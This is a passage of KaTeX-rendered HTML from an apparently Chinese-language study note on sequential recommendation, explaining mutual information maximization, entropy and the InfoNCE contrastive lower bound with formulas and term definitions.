xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">A_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">A</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>，顺序推荐的任务是预测用户在第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding=\"application/x-tex\">n+1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">1</span></span></span></span> 步可能与之交互的下一个项目</li>\n</ul>\n<h2 id=\"mim相互信息最大化\"><a class=\"anchor\" href=\"#mim相互信息最大化\">#</a> MIM—— 相互信息最大化</h2>\n<ul>\n<li>\n<p>简单理解：给定两个随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi><mtext>和</mtext><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">X和Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord cjk_fallback\">和</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span>，MIM 可以理解为如果知道了<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 可以减少多少<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 的不确定性</p>\n</li>\n<li>\n<p>公式如下:</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>I</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo separator=\"true\">,</mo><mi>Y</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mi mathvariant=\"normal\">∣</mi><mi>Y</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>Y</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>H</mi><mo stretchy=\"false\">(</mo><mi>Y</mi><mi mathvariant=\"normal\">∣</mi><mi>X</mi><mo stretchy=\"false\">)</mo><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">I(X,Y)=H(X)-H(X|Y)=H(Y)-H(Y|X).\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mord\">∣</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span><span class=\"mord\">.</span></span></span></span></span></p>\n<p><strong>熵</strong>是用于衡量一个随机变量不确定性的度量。对于离散随机变量 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span>, 其熵定义为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>H</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mo>−</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi mathvariant=\"script\">X</mi></mrow></munder><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mi>log</mi><mo>⁡</mo><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">H(X)=-\\sum_{x\\in\\mathcal{X}}p(x)\\log p(x)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.08125em;\">H</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.3717110000000003em;vertical-align:-1.321706em;\"></span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.050005em;\"><span style=\"top:-1.8556639999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">x</span><span class=\"mrel mtight\">∈</span><span class=\"mord mtight\"><span class=\"mord mathcal mtight\" style=\"margin-right:0.14643em;\">X</span></span></span></span></span><span style=\"top:-3.0500049999999996em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.321706em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<ul>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi mathvariant=\"script\">X</mi></mrow><annotation encoding=\"application/x-tex\">\\mathcal{X}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathcal\" style=\"margin-right:0.14643em;\">X</span></span></span></span></span> 是随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的所有可能取值的集合</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span></span></span></span> 是<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 取值为<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 的概率</li>\n<li>熵越大表示随机变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>X</mi></mrow><annotation encoding=\"application/x-tex\">X</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span></span></span></span> 的不确定性越高，信息量也就越大</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"infonce\"><a class=\"anchor\" href=\"#infonce\">#</a> InfoNCE</h3>\n<p>实践证明，一个特定下限<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>N</mi><mi>C</mi><mi>E</mi></mrow><annotation encoding=\"application/x-tex\">InfoNCE</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span></span></span></span> 对于求 MIM 表现很好，其基于噪声对比估计（NCE）</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>I</mi><mi>n</mi><mi>f</mi><mi>o</mi><mi>N</mi><mi>C</mi><mi>E</mi><mo>=</mo><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>X</mi><mo separator=\"true\">,</mo><mi>Y</mi><mo stretchy=\"false\">)</mo></mrow></msub><mo stretchy=\"false\">[</mo><msub><mi>f</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo><mo>−</mo><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>q</mi><mo stretchy=\"false\">(</mo><mover accent=\"true\"><mi>Y</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo></mrow></msub><mo stretchy=\"false\">[</mo><mi>log</mi><mo>⁡</mo><munder><mo>∑</mo><mrow><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover><mo>∈</mo><mover accent=\"true\"><mi>Y</mi><mo>~</mo></mover></mrow></munder><mi>exp</mi><mo>⁡</mo><msub><mi>f</mi><mi>θ</mi></msub><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mover accent=\"true\"><mi>y</mi><mo>~</mo></mover><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">]</mo><mo stretchy=\"false\">]</mo><mo>+</mo><mi>log</mi><mo>⁡</mo><mi mathvariant=\"normal\">∣</mi><mover accent=\"true\"><mi>Y</mi><mo>~</mo></mover><mi mathvariant=\"normal\">∣</mi></mrow><annotation encoding=\"application/x-tex\">InfoNCE=\\mathbb{E}_{p(X,Y)}[f_{\\theta}(x,y)-\\mathbb{E}_{q(\\tilde{Y})}[\\log\\sum_{\\tilde{y}\\in\\tilde{Y}}\\exp f_{\\theta}(x,\\tilde{y})]]+\\log|\\tilde{Y}|\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">E</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1052em;vertical-align:-0.3551999999999999em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">p</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07847em;\">X</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">Y</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:2.6462510000000004em;vertical-align:-1.5962459999999998em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.4006670000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">q</span><span class=\"mopen mtight\">(</span><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">Y</span></span></span><span style=\"top:-3.3023300000000004em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.47433299999999984em;\"><span></span></span></span></span></span></span><span class=\"mopen\">[</span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop op-limits\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.0500050000000003em;\"><span style=\"top:-1.689862em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord accent mtight\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.0500000000000003em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord mtight\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"mrel mtight\">∈</span><span class=\"mord accent mtight\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-2.7em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">Y</span></span></span><span style=\"top:-3.3023300000000004em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord mtight\">~</span></span></span></span></span></span></span></span></span></span><span style=\"top:-3.050005em;\"><span class=\"pstrut\" style=\"height:3.05em;\"></span><span><span class=\"mop op-symbol large-op\">∑</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.5962459999999998em;\"><span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mop\">exp</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord accent\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.6678599999999999em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span><span style=\"top:-3.35em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.19444em;\"><span class=\"mord\">~</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.19444em;\"><span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mclose\">]</span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1701899999999998em;vertical-align:-0.25em;\"></span><span class=\"mop\">lo<span style=\"margin-right:0.01389em;\">g</span></span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">∣</span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.9201899999999998em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span><span style=\"top:-3.6023300000000003em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"accent-body\" style=\"left:-0.25em;\"><span class=\"mord\">~</span></span></span></span></span></span></span><span class=\"mord\">∣</span></span></span></span></span></p>\n<ul>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>f</mi><mi>θ</mi></msub></mrow><annotation encoding=\"application/x-tex\">f_{\\theta}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.02778em;\">θ</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是一个参数化的打分函数（例如两个嵌入的点积），用于计算<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">x</span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span></span></span></span> 之间的相关性</p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>Y</mi></mrow><annotation encoding=\"application/x-tex\">Y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.22222em;\">Y</span></span></span></span> 是负样本的集合</p>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi mathvariant=\"double-struck\">E</mi><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow></msub></mrow><annotation encoding=\"application/x-tex\">\\mathbb{E}_{p(x,y)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.04409em;vertical-align:-0.3551999999999999em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">E</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">p</span><span class=\"mopen mtight\">(</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mpunct mtight\">,</span><span class=\"mord mathnormal mtight\" style=\"margin-right:0.03588em;\">y</span><span class=\"mclose mtight\">)</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span></span> 是期望值，表示对联合分布<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mo stretchy=\"false\">(</mo><mi>x</mi><mo separator=\"true\">,</mo><mi>y</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">p(x,y)</annotation></semantics></math></span><span class=\"katex-html\" 